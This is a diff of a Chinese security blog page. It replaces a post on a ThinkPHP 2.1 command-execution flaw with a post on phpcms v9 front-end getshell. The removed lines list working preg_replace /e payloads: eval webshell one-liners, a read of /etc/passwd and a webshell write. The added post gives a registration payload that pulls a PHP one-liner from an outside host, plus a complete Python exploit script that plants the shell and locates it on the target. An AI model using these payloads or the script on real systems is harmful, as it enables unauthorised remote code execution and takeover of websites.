@@ -7,19 +7,19 @@
   
   
   
-  <title>ThinkPHP2.1命令执行漏洞 | r1b00t’Blog</title>
+  <title>phpcms v9前台getshell | r1b00t’Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="r1b00t|Thinkphp2.1|命令执行">
-<meta name="keywords" content="漏洞">
+  <meta name="description" content="r1b00t|Htran|phpcms">
+<meta name="keywords" content="渗透,内网,Htran,phpcms,Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ThinkPHP2.1命令执行漏洞">
-<meta property="og:url" content="https://r1b00t.github.io/2017/08/29/ThinkPHP2.1命令执行漏洞/index.html">
+<meta property="og:title" content="phpcms v9前台getshell">
+<meta property="og:url" content="https://r1b00t.github.io/2017/08/31/phpcms v9 前台getshell/index.html">
 <meta property="og:site_name" content="r1b00t’Blog">
-<meta property="og:description" content="r1b00t|Thinkphp2.1|命令执行">
-<meta property="og:updated_time" content="2017-08-30T06:32:26.373Z">
+<meta property="og:description" content="r1b00t|Htran|phpcms">
+<meta property="og:updated_time" content="2017-08-31T03:04:19.121Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ThinkPHP2.1命令执行漏洞">
-<meta name="twitter:description" content="r1b00t|Thinkphp2.1|命令执行">
+<meta name="twitter:title" content="phpcms v9前台getshell">
+<meta name="twitter:description" content="r1b00t|Htran|phpcms">
   
     <link rel="alternative" href="/atom.xml" title="r1b00t’Blog" type="application/atom+xml">
   
@@ -234,11 +234,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-ThinkPHP2.1命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-phpcms v9 前台getshell" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2017/08/29/ThinkPHP2.1命令执行漏洞/" class="article-date">
-      <time datetime="2017-08-29T07:55:36.318Z" itemprop="datePublished">2017-08-29</time>
+      <a  href="/2017/08/31/phpcms v9 前台getshell/" class="article-date">
+      <time datetime="2017-08-31T03:04:05.754Z" itemprop="datePublished">2017-08-31</time>
 </a>
 
     </div>
@@ -252,7 +252,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ThinkPHP2.1命令执行漏洞
+      phpcms v9前台getshell
     </h1>
   
 
@@ -262,13 +262,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/vuln/">vuln</a>
+    <a class="article-category-link" href="/categories/Web渗透/">Web渗透</a><a class="article-category-link" href="/categories/Web渗透/nw/">nw</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Htran/">Htran</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/phpcms/">phpcms</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网/">内网</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -278,32 +278,14 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="ThinkPHP-2-1-命令执行漏洞"><a href="#ThinkPHP-2-1-命令执行漏洞" class="headerlink" title="ThinkPHP 2.1 命令执行漏洞"></a>ThinkPHP 2.1 命令执行漏洞</h2><h3 id="使用了preg-replace-e模式-导致命令执行"><a href="#使用了preg-replace-e模式-导致命令执行" class="headerlink" title="使用了preg_replace() +/e模式  导致命令执行"></a>使用了preg_replace() +/e模式  导致命令执行</h3><pre><code>○ http://192.168.20.70/index.php/Index/index/name/${@print(eval($_POST[zng]))} eval 可以改成phpinfo()
+        <h1 id="phpcms-v9前台getshell"><a href="#phpcms-v9前台getshell" class="headerlink" title="phpcms v9前台getshell"></a>phpcms v9前台getshell</h1><p>在用户注册界面输入要注册的信息<br>然后通过Brup抓包 ，修改一下 Payload里面的账号 和邮箱 和昵称不能重复<br>src那里修改自己的域名</p>
+<p>Payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">siteid=1&amp;modelid=2&amp;username=test&amp;password=test123&amp;pwdconfirm=test123&amp;email=test%40qq.com&amp;nickname=test233&amp;dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&amp;protocol=&amp;info[content]=&lt;img src=http://phpcms.0day5.com/test.php#.jpg&gt;</div></pre></td></tr></table></figure></p>
+<p>如果自己网站下解析php的话那么php内容应该是&lt;?php echo ‘&lt;?php eval($_POST[cmd]);?&gt;’;?&gt; 否则下载后得到的文件内容是空白，copy访问远程文件也像IE一样，访问后取得解析后的内容。</p>
+<p>在Brup里面点击Go以后会爆出保存shell的路径<br>，然后拿菜刀连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div style=&quot;font-size:12px;text-align:left; border:1px solid #9cc9e0; padding:1px 4px;color:#000000;font-family:Arial, Helvetica,sans-serif;&quot;&gt;&lt;span&gt;&lt;b&gt;MySQL Query : &lt;/b&gt; INSERT INTO `phpcms`.`v9_`(`content`,`userid`) VALUES (&apos;&amp;lt;img src=http://192.168.20.120:5000/uploadfile/2017/0831/20170831104425380.php&amp;gt;&apos;,&apos;69&apos;) &lt;br /&gt;&lt;b&gt; MySQL Error : &lt;/b&gt;Table &apos;phpcms.v9_&apos; doesn&apos;t exist &lt;br /&gt; &lt;b&gt;MySQL Errno : &lt;/b&gt;1146 &lt;br /&gt;&lt;b&gt; Message : &lt;/b&gt; Table &apos;phpcms.v9_&apos; doesn&apos;t exist &lt;br /&gt;&lt;a href=&apos;http://faq.phpcms.cn/?errno=1146&amp;msg=Table+%27phpcms.v9_%27+doesn%27t+exist&apos; target=&apos;_blank&apos; style=&apos;color:red&apos;&gt;Need Help?&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;</div></pre></td></tr></table></figure></p>
+<p>详细链接：<a href="http://0day5.com/archives/4368/" target="_blank" rel="external">http://0day5.com/archives/4368/</a></p>
+<p>Python脚本 EXP：    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import requests</div><div class="line">import sys</div><div class="line">from datetime import datetime</div><div class="line">def getTime():</div><div class="line">    year = str(datetime.now().year)</div><div class="line">    month = &quot;%02d&quot; % datetime.now().month</div><div class="line">    day = &quot;%02d&quot; % datetime.now().day</div><div class="line">    hour = datetime.now().hour</div><div class="line">    hour = hour - 12 if hour &gt; 12 else hour</div><div class="line">    hour = &quot;%02d&quot; % hour</div><div class="line">    minute = &quot;%02d&quot; % datetime.now().minute</div><div class="line">    second = &quot;%02d&quot; % datetime.now().second</div><div class="line">    microsecond = &quot;%06d&quot; % datetime.now().microsecond</div><div class="line">    microsecond = microsecond[:3]</div><div class="line">    nowTime = year + month + day + hour + minute + second + microsecond</div><div class="line">    return int(nowTime), year + &quot;/&quot; + month + day + &quot;/&quot;</div><div class="line">def main():</div><div class="line">    if len(sys.argv) &lt; 2:</div><div class="line">        print(&quot;[*]Usage   : Python 1.py http://xxx.com&quot;)</div><div class="line">        sys.exit()</div><div class="line">    host = sys.argv[1]</div><div class="line">    url = host + &quot;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&quot;</div><div class="line">    data = &#123;</div><div class="line">        &quot;siteid&quot;: &quot;1&quot;,</div><div class="line">        &quot;modelid&quot;: &quot;1&quot;,</div><div class="line">        &quot;username&quot;: &quot;adamin&quot;,</div><div class="line">        &quot;password&quot;: &quot;123456&quot;,</div><div class="line">        &quot;email&quot;: &quot;admian@qq.com&quot;,</div><div class="line">        # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0</div><div class="line">        &quot;info[content]&quot;: &quot;&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;&quot;,</div><div class="line">        &quot;dosubmit&quot;: &quot;1&quot;,</div><div class="line">        &quot;protocol&quot;: &quot;&quot;,</div><div class="line">    &#125;</div><div class="line">    try:</div><div class="line">        startTime, _ = getTime()</div><div class="line">        htmlContent = requests.post(url, data=data)</div><div class="line">        finishTime, dateUrl = getTime()</div><div class="line">        if &quot;MySQL Error&quot; in htmlContent.text and &quot;http&quot; in htmlContent.text:</div><div class="line">            successUrl = htmlContent.text[htmlContent.text.index(&quot;http&quot;):htmlContent.text.index(&quot;.php&quot;)] + &quot;.php&quot;</div><div class="line">            print(&quot;[*]Shell  : %s&quot; % successUrl)</div><div class="line">        else:</div><div class="line">            print(&quot;[-]Notice : writing remoteShell successfully, but failing to get the echo. You can wait the program crawl the uploadfile(in 1-3 second)，or re-run the program after modifying value of username and email.\n&quot;)</div><div class="line">            successUrl = &quot;&quot;</div><div class="line">            for t in range(startTime, finishTime):</div><div class="line">                checkUrlHtml = requests.get(</div><div class="line">                    host + &quot;/uploadfile/&quot; + dateUrl + str(t) + &quot;.php&quot;)</div><div class="line">                if checkUrlHtml.status_code == 200:</div><div class="line">                    successUrl = host + &quot;/uploadfile/&quot; + \</div><div class="line">                        dateUrl + str(t) + &quot;.php&quot;</div><div class="line">                    print(&quot;[*]Shell  : %s&quot; % successUrl)</div><div class="line">                    break</div><div class="line">            if successUrl == &quot;&quot;:</div><div class="line">                print(</div><div class="line">                    &quot;[x]Failed : had crawled all possible url, but i can&apos;t find out it. So it&apos;s failed.\n&quot;)</div><div class="line">    except:</div><div class="line">        print(&quot;Request Error&quot;)</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
 
-○ {${exit(print(getcwd()))};}
-
-○ http://localhost/code.php?data={${eval($_POST[1])};} 一句话木马
-
-○ http://localhost/code.php?data={${exit(print(getcwd()))};}
-获取工作路径
-
-○ http://localhost/code.php?data={${exit(var_dump(file_get_contents($_POST[f])))};}
-
-○ POST 方式读取文件 利用火狐 hackbar 插件 Enable Post data 参数 f=文件名
-○ http://localhost/code.php?data={${exit(var_dump(file_put_contents($_POST[f],$_POST[d])))};}
-
-○ POST 方式读取文件 利用火狐 hackbar 插件 Enable Post data 参数 f=文件名，d 是数据
-○ 参数形式是 f=文件名&amp;d=内容
-○ 漏洞利用
-○     {${eval($_POST[1])} ;} 一句话
-○     {${exit(print(getcwd()))};} 获取当前工作路径
-○     {${exit(var_dump(file_get_contents($_POST[f])))}} 读文件 f=/etc/passwd 
-○     {${exit(var_dump(file_put_contents($_POST[f], $_POST[d])))}}
-○     写 webshell f=1.php&amp;d=1111111
-○     intext:thinkphp intext:&quot;Fast &amp; Simple OOP PHP Framework&quot; intext:&quot;2.1&quot;
-○     ${@print(eval($_POST[1]))}
-○     {${@eval($_POST[1])}}
-</code></pre>
       
     </div>
     
@@ -311,13 +293,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a  href="/2017/08/29/ThinkPHP2.1命令执行漏洞/">ThinkPHP2.1命令执行漏洞</a></p>
+        <p><span>本文标题:</span><a  href="/2017/08/31/phpcms v9 前台getshell/">phpcms v9前台getshell</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 r1b00t 的个人博客">r1b00t</a></p>
-        <p><span>发布时间:</span>2017年08月29日 - 15时55分</p>
-        <p><span>最后更新:</span>2017年08月30日 - 14时32分</p>
+        <p><span>发布时间:</span>2017年08月31日 - 11时04分</p>
+        <p><span>最后更新:</span>2017年08月31日 - 11时04分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/08/29/ThinkPHP2.1命令执行漏洞/" title="ThinkPHP2.1命令执行漏洞">https://r1b00t.github.io/2017/08/29/ThinkPHP2.1命令执行漏洞/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://r1b00t.github.io/2017/08/29/ThinkPHP2.1命令执行漏洞/　　作者: r1b00t" title=""></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/08/31/phpcms v9 前台getshell/" title="phpcms v9前台getshell">https://r1b00t.github.io/2017/08/31/phpcms v9 前台getshell/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://r1b00t.github.io/2017/08/31/phpcms v9 前台getshell/　　作者: r1b00t" title=""></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -328,18 +310,9 @@
 
 <nav id="article-nav">
   
-    <a  href="/2017/08/29/Hydra/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          Hydra使用
-        
-      </div>
-    </a>
   
-  
-    <a  href="/2017/08/29/linux学习笔记/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Linux学习笔记</div>
+    <a  href="/2017/08/30/FPipe端口转发使用/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">FPipe进行端口重定向使用方法</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -351,7 +324,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP-2-1-命令执行漏洞"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP 2.1 命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用了preg-replace-e模式-导致命令执行"><span class="toc-number">1.1.</span> <span class="toc-text">使用了preg_replace() +/e模式  导致命令执行</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#phpcms-v9前台getshell"><span class="toc-number">1.</span> <span class="toc-text">phpcms v9前台getshell</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -410,13 +383,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2017/08/29/Hydra/" title="上一篇: Hydra使用">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2017/08/29/linux学习笔记/" title="下一篇: Linux学习笔记">
+            <a  href="/2017/08/30/FPipe端口转发使用/" title="下一篇: FPipe进行端口重定向使用方法">
                 <i class="fa fa-angle-right"></i>
             </a>
         
